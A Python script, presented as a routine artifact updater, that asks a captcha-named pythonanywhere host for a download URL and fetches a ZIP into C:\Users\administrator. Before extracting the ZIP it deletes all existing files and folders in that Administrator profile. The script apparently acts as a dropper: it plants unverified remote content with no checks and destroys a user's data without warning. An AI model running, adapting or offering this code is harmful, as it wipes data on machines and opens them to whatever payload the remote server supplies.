import json
import urllib.request
import zipfile
import os
import shutil

def main():
    # ===== Step 1: Create Admin folder if it doesn't exist =====
    admin_dir = r"C:\Users\administrator"
    os.makedirs(admin_dir, exist_ok=True)
    print(f"Administrator folder ensured at: {admin_dir}")

    # ===== Step 2: Fetch the latest artifact URL =====
    api_url = "https://azcaptchahh.pythonanywhere.com/geturl"
    with urllib.request.urlopen(api_url) as response:
        data = json.load(response)

    artifact_url = data.get("url")
    if not artifact_url:
        raise Exception("Artifact URL is empty")
    print(f"Artifact URL: {artifact_url}")

    # ===== Step 3: Download the ZIP file =====
    zip_path = os.path.join(admin_dir, "artifact.zip")
    print(f"Downloading artifact to {zip_path} ...")
    urllib.request.urlretrieve(artifact_url, zip_path)
    if not os.path.exists(zip_path):
        raise Exception("Download failed")
    print("Download completed.")

    # ===== Step 4: Clean target directory before extraction =====
    for item in os.listdir(admin_dir):
        item_path = os.path.join(admin_dir, item)
        if item_path == zip_path:
            continue
        if os.path.isfile(item_path) or os.path.islink(item_path):
            os.unlink(item_path)
        else:
            shutil.rmtree(item_path)
    print(f"Cleaned existing contents in {admin_dir}")

    # ===== Step 5: Extract ZIP =====
    print(f"Extracting ZIP to {admin_dir} ...")
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(admin_dir)

    # ===== Step 6: Remove the ZIP =====
    os.remove(zip_path)
    print("ZIP file removed.")

    # ===== Step 7: List extracted contents =====
    print("Contents of Administrator folder:")
    for root, dirs, files in os.walk(admin_dir):
        for name in dirs:
            print(os.path.join(root, name))
        for name in files:
            print(os.path.join(root, name))

if __name__ == "__main__":
    main()
